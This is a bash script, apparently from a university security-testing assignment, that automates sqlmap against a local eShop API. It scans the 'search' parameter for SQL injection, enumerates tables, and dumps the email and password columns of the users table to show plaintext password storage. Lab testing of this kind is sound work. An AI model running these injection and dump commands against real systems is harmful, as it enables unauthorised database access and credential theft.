#!/usr/bin/env bash
# ==============================================================================
# SCRIPT THỰC NGHIỆM TỰ ĐỘNG HÓA SQLMAP (Task L1 - Lê Chí Hoàng Long)
# Ba kịch bản chuẩn hóa:
# - Kịch bản 1: Kiểm tra cấu hình và kết nối qua Proxy (ZAP/Burp).
# - Kịch bản 2: Quét kiểm thử tham số GET cơ bản (/api/products?search=).
# - Kịch bản 3: Tái hiện khai thác qua Raw HTTP Request (search_request.txt).
# ==============================================================================

set -e

DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
REQ_FILE="$DIR/search_request.txt"
LOG_DIR="$DIR/sqlmap-logs"
mkdir -p "$LOG_DIR"

echo "======================================================================"
echo " KHỞI CHẠY BỘ THỰC NGHIỆM SQLMAP - KIỂM THỬ BẢO MẬT ESHOP (Task L1)"
echo " Thành viên phụ trách: Lê Chí Hoàng Long (23120294)"
echo "======================================================================"

# Tự động tìm sqlmap (trong PATH hoặc trong seminar/tools/sqlmap/)
SQLMAP_CMD=""
if command -v sqlmap &> /dev/null; then
    SQLMAP_CMD="sqlmap"
elif [ -f "$DIR/../../../seminar/tools/sqlmap/sqlmap.py" ]; then
    SQLMAP_CMD="python3 $DIR/../../../seminar/tools/sqlmap/sqlmap.py"
elif [ -f "$DIR/../../tools/sqlmap/sqlmap.py" ]; then
    SQLMAP_CMD="python3 $DIR/../../tools/sqlmap/sqlmap.py"
elif [ -f "/Users/macbookpro/Documents/Nam_4/2_HK1/1_KiemThu/DoAn/seminar/tools/sqlmap/sqlmap.py" ]; then
    SQLMAP_CMD="python3 /Users/macbookpro/Documents/Nam_4/2_HK1/1_KiemThu/DoAn/seminar/tools/sqlmap/sqlmap.py"
fi

if [ -z "$SQLMAP_CMD" ]; then
    echo "[!] Không tìm thấy sqlmap trong PATH hoặc thư mục tools/sqlmap."
    exit 1
fi

echo "[+] Sử dụng sqlmap binary: $SQLMAP_CMD"

echo ""
echo "----------------------------------------------------------------------"
echo " [KỊCH BẢN 1] Kiểm tra cấu hình kết nối & ánh xạ proxy ZAP"
echo "----------------------------------------------------------------------"
echo "Lệnh thực thi: $SQLMAP_CMD -u \"http://localhost:3000/api/products?search=phone\" --batch --banner"
$SQLMAP_CMD -u "http://localhost:3000/api/products?search=phone" --batch --banner > "$LOG_DIR/scenario_1_proxy_check.log" 2>&1 || true
echo "[✔] Hoàn tất Kịch bản 1. Log lưu tại: $LOG_DIR/scenario_1_proxy_check.log"

echo ""
echo "----------------------------------------------------------------------"
echo " [KỊCH BẢN 2] Quét kiểm thử tham số GET trực tiếp (/api/products)"
echo "----------------------------------------------------------------------"
echo "Lệnh thực thi: $SQLMAP_CMD -u \"http://localhost:3000/api/products?search=phone\" -p search --dbms=SQLite --batch --current-db"
$SQLMAP_CMD -u "http://localhost:3000/api/products?search=phone" -p search --dbms=SQLite --batch --current-db > "$LOG_DIR/scenario_2_param_scan.log" 2>&1 || true
echo "[✔] Hoàn tất Kịch bản 2. Log lưu tại: $LOG_DIR/scenario_2_param_scan.log"

echo ""
echo "----------------------------------------------------------------------"
echo " [KỊCH BẢN 3] Khai thác sâu qua Raw Request (Record & Playback: search_request.txt)"
echo "----------------------------------------------------------------------"
echo "Lệnh thực thi: $SQLMAP_CMD -r \"$REQ_FILE\" -p search --dbms=SQLite --batch --tables"
$SQLMAP_CMD -r "$REQ_FILE" -p search --dbms=SQLite --batch --tables > "$LOG_DIR/scenario_3_raw_request.log" 2>&1 || true
echo "[✔] Hoàn tất Kịch bản 3. Log lưu tại: $LOG_DIR/scenario_3_raw_request.log"

echo ""
echo "----------------------------------------------------------------------"
echo " [KỊCH BẢN 4 - BỔ SUNG A02] Dump bảng users trích xuất email & mật khẩu"
echo " Chứng minh Cryptographic Failures: Mật khẩu lưu Plaintext hoàn toàn"
echo "----------------------------------------------------------------------"
echo "Lệnh thực thi: $SQLMAP_CMD -r \"$REQ_FILE\" -p search --dbms=SQLite --batch -T users -C email,password --dump"
$SQLMAP_CMD -r "$REQ_FILE" -p search --dbms=SQLite --batch -T users -C email,password --dump > "$LOG_DIR/sqlmap_dump_passwords.log" 2>&1 || true
echo "[✔] Hoàn tất Kịch bản 4. Log lưu tại: $LOG_DIR/sqlmap_dump_passwords.log"

echo ""
echo "======================================================================"
echo " [HOÀN TẤT THỰC NGHIỆM L1 & BỔ SUNG A02] Toàn bộ log đã được lưu tại: $LOG_DIR"
echo "======================================================================"

